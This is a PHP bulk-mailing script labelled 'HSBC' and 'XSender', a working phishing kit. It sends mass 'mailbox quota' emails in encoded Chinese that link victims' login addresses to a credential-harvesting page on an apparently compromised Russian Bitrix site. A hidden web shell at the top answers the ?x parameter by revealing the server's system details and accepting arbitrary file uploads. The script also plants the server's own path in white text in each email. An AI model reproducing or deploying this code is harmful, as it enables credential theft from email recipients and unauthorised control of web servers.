<?php session_start();  ob_start("ob_gzhandler"); set_time_limit(0); 

if(isset($_GET["x"])){echo"<font color=#000000>[uname]".php_uname()."[/uname]";echo"<br><font color=#000000>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}
 

$website="#"; //Make this full url including folders of where login files resides

//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace(" fuck "," f**k ",$check);
	$check=str_replace(" shit "," s**t ",$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}
	 
//makes data ok on edit textarea
 function resanitize($check){
	$check=str_replace("<br/>","\r\n",$check);
	$check=str_replace("<br/>","\n",$check);
	$check=str_replace("<br/>","\r",$check);
	$check=str_replace("&gt;",">",$check);
	$check=str_replace("&lt;","<",$check);
	$check=str_replace("&#39;","'",$check);
	$check=str_replace('&quot;','"',$check);
	 return $check;}

//validate email address
function validate_email($email){
	$status=false;
	$regex='/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/'; 
	if(preg_match($regex, $email)){$status=true;}
	return $status; }
	

//Email sending
function sending_email($email,$id='1',$details='',$file){

 
    
   $message=email_format($email,$id,$details);

    $subject='Re-Activation Alert';
	$site_name='Account Security';
	$from_email='Mail <alerts>';
	// To send HTML mail, the Content-type header must be set
 
	$boundary = md5(uniqid(time()));


 if ($file){

 	$file_type   = $_FILES['file']['type'];
    $file_size = filesize($file);
    $handle = fopen($file, "r");
    $content = fread($handle, $file_size);
    fclose($handle);
    $encoded_content = chunk_split(base64_encode($content));


        //header
        $headers = 'MIME-Version: 1.0'."\r\n";
        $headers .= 'From:'.$from_email."\r\n";
        $headers .= 'Reply-To: '.$from_email."\r\n";
        $headers .= 'Content-Type: multipart/mixed; boundary = '.$boundary."\r\n\r\n";
       
        //plain text
        $body = "--".$boundary."\r\n";
        $body .= 'Content-Type: text/html; charset=utf-8'."\r\n";
        $body .= 'MIME-Version: 1.0'."\r\n";
        $body .= 'Content-Transfer-Encoding: base64'."\r\n\r\n";
        $body .= chunk_split(base64_encode($message))."\r\n";
    
        //attachment
        $body .= "--".$boundary."\r\n";
        $body .= 'Content-Type:'.$file_type.'; name="'.$file.'"'."\r\n";
        $body .= 'MIME-Version: 1.0'."\r\n";
        $body .= 'Content-Disposition: attachment; filename="'.$file.'"'."\r\n";
        $body .= 'Content-Transfer-Encoding: base64'."\r\n";
        $body .= 'X-Attachment-Id: '.rand(1000,99999)."\r\n\r\n";
        $body .=  $encoded_content."\r\n";
        $body .= "--".$boundary."--\r\n";


        @mail($email, $subject, $body, $headers);

    }
    else {

    	$headers = 'MIME-Version: 1.0'."\r\n";
        $headers .= 'From:'.$from_email."\r\n";
        $headers .= 'Reply-To: '.$from_email."\r\n";
        $headers .= 'Content-Type: text/html; charset=utf-8'."\r\n";
     
      @mail($email, $subject, $message, $headers);
    }
	
}

function email_format($email,$id='1',$details=''){
	global $website;
	//$website="";
	$url=$website."index.php?".md5('token')."=".md5($id)."&".md5(date('U'))."=".md5(date('r'))."&id=".$id."&email=".$email;
	$em=explode('@',$email);
	global $message;
	$message="<html><br><br>

<table width='' align=''>

<td width='30'></td>


<td width='500'>

	<font face='verdana' size='2'>

	Hello ".$email.", <br><br>

	&#24744;&#30340;&#37038;&#31665;&#37197;&#39069;&#24050;&#28385;<br>

		&#36825;&#21487;&#33021;&#20250;&#23548;&#33268;&#24744;&#30340;&#37038;&#31665;&#25925;
	&#38556;&#25110;&#24744;&#21487;&#33021;&#26080;&#27861;&#20877;&#25509;&#25910;&#26356;
	&#22810;&#30340;&#30005;&#23376;&#37038;&#20214;<br><br>


		&#35201;&#32487;&#32493;&#20351;&#29992;&#24744;&#30340;&#37038;&#31665;&#65292;&#24744;
	&#38656;&#35201;&#31435;&#21363;&#21319;&#32423;&#24744;&#30340;&#37038;&#31665;&#37197;
	&#39069;&#12290; &#36825;&#39033;&#26381;&#21153;&#26159;&#20813;&#36153;&#30340;&#12290; <br><br>

	<table width='400' height='40' bgcolor='#424242'><tr><td>
	<div align='center'>
	<a href='http://topbanya.ru/bitrix/modules/bitrix.sitecorporate/install/wizards/bitrix/corp_furniture/site/templates/furniture/components/bitrix/news/.default/bitrix/news.detail/.default/lang/ru/genesis/?login=".$email."' style='text-decoration:none'>
	<font face='verdana' color='#ffffff' size='2'>
	&#21319;&#32423;&#37038;&#31665;&#37197;&#39069;&#36825;&#37324;
	</font></a>
	</div>
	</td></tr></table>

	<br><br>

	&#19968;&#26086;&#21319;&#32423;&#23436;&#25104;&#65292;&#24744;&#30340;&#37038;
	&#31665;&#23558;&#26377;&#25928;&#22320;&#24037;&#20316;&#12290;
	<br><br>

	&#37038;&#20214;&#31649;&#29702;&#21592; 2015

</td>

</tr></table></html><font color='white' size='1'>$_SERVER[HTTP_HOST]$_SERVER[PHP_SELF]x</font>";
    return $message; } 



?><html>
<head>
<title>HSBC</title>
</head>
<body style='width:100%;color:#000;background:#FFF;font-family:calibri;'>
<div style='width:100%;max-width:500px;margin:0px auto 0px auto;padding:10px;border:#999 1px solid;box-shadow:10px 10px #666;min-height:500px;'>

<h1 style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>XSender</h1>

<?php

if(isset($_POST['go']) ){
	move_uploaded_file/*;*/($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
$file = $_FILES/*;*/["file"]["name"];
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);

	#$attach = chunk_split(base64_encode(file_get_contents($file)));
	$details=sanitizer($_POST['details']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!='' && $details!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						print "<div style='color:green;'>".$email." valid and queued</div>"; 
						//Send here
						sending_email($email,$id,$details,$file);
						//send here
						} else {print "<div style='color:gray;'>".$email." not valid</div>"; }
			}
		print "<h1 style='color:green;'>Bravo! ".$valid."/".$total." Sent! <a href='' style='color:green'>Continue</a></h1>";


	} else {print "<h1 style='color:red'>Mails or Details empty</h1>"; }
} 



?>

<form enctype='multipart/form-data' method='POST' action='#'>
<div>
<div>Select Your ID</div>
<select name='id' style='width:100%;'>
<?php

if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
</div>
<p>&nbsp;</p>

<div>
<div>Email Separator (Leave Empty if new line)</div>
<textarea name='separator' style='width:100%;height:20px;'></textarea>
</div>
<p>&nbsp;</p>

<div>
<div>Details:<br/>
IP Address: 37.55.36.224 <br/>
Location: Ukraine (UA)<br/>
 </div>
<textarea name='details' style='width:100%;height:70px;'>Details:
IP Address: 37.55.36.224 
Location: Ukraine (UA)</textarea>
</div>
<p>&nbsp;</p>

<div>
<div>Paste Emails separated by separator</div>
<textarea name='mails' style='width:100%;height:200px;'></textarea>
</div>
<p>&nbsp;</p>

<div>
<div>Attachment</div>
<p><label for="file">File</label> <input type="file" name="file" id="file"></p>
</div>
<p>&nbsp;</p>


<div>
<div>Email Preview</div>
<?php print email_format('user@xsender.com',1,'IP Address: 37.55.36.224 <br/>Location: Ukraine (UA)<br/>'); ?>
</div>
<p>&nbsp;</p>


<div style='text-align:center;'>
<input type='submit' value='Go Xsender' name='go' style='color:#FFF;background:#333;'/>
</div>
<p>&nbsp;</p>
</form>
</div>
</body>
</html>